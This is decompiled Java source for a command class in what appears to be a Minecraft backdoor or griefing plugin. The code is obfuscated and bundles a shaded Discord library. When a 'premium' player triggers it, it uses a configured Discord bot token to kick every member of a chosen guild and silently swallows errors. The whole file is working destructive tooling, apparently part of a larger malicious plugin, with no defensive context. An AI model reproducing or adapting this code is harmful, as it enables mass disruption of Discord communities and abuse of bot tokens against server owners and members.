/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.entity.Player
 */
package me.system.runner.command.impl.premium.bot;

import com.minecraftforceop.jda.jda.api.entities.Guild;
import com.minecraftforceop.jda.jda.api.entities.Member;
import java.util.Base64;
import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.data.DataManager;
import me.system.runner.utils.Settings;
import org.bukkit.entity.Player;

public class KickallusersCommand
extends Command {
    @Override
    public void execute(Core lllllllllllllIlllIllllIIlllllIlI, String lllllllllllllIlllIllllIIlllllIIl, String[] lllllllllllllIlllIllllIIlllllIII, Player lllllllllllllIlllIllllIIllllIlll) {
        if (lllllllllllllIlllIllllIIlllllIlI.premium.contains(lllllllllllllIlllIllllIIllllIlll.getName())) {
            if (lllllllllllllIlllIllllIIlllllIlI.botEnabled) {
                byte[] lllllllllllllIlllIllllIIllllllIl = Base64.getDecoder().decode(DataManager.getData().getString("id"));
                Guild lllllllllllllIlllIllllIIllllllII = lllllllllllllIlllIllllIIlllllIlI.jda.getGuildById(new String(lllllllllllllIlllIllllIIllllllIl));
                if (lllllllllllllIlllIllllIIllllllII == null) {
                    lllllllllllllIlllIllllIIllllIlll.sendMessage(Settings.PREFIX("The bot doesn't seem to be in the guild set! Use setguild"));
                } else {
                    try {
                        lllllllllllllIlllIllllIIllllllII.getMembers().forEach(lllllllllllllIlllIllllIIlllIllIl -> lllllllllllllIlllIllllIIllllllII.kick((Member)lllllllllllllIlllIllllIIlllIllIl, "Wendellmeset").complete());
                    }
                    catch (Exception lllllllllllllIlllIllllIIllllIIlI) {
                        // empty catch block
                    }
                    lllllllllllllIlllIllllIIllllIlll.sendMessage(Settings.PREFIX("All users were kicked!"));
                }
            } else {
                lllllllllllllIlllIllllIIllllIlll.sendMessage(Settings.PREFIX("The bot doesn't seem to be logged in! Use settoken"));
            }
        } else {
            lllllllllllllIlllIllllIIllllIlll.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("You must be a ").append(Settings.RED).append("premium user ").append(Settings.WHITE).append(" to execute this command"))));
        }
    }

    public KickallusersCommand() {
        KickallusersCommand lllllllllllllIlllIllllIlIIIIIIll;
    }

    @Override
    public boolean isBlatant() {
        return true;
    }
}

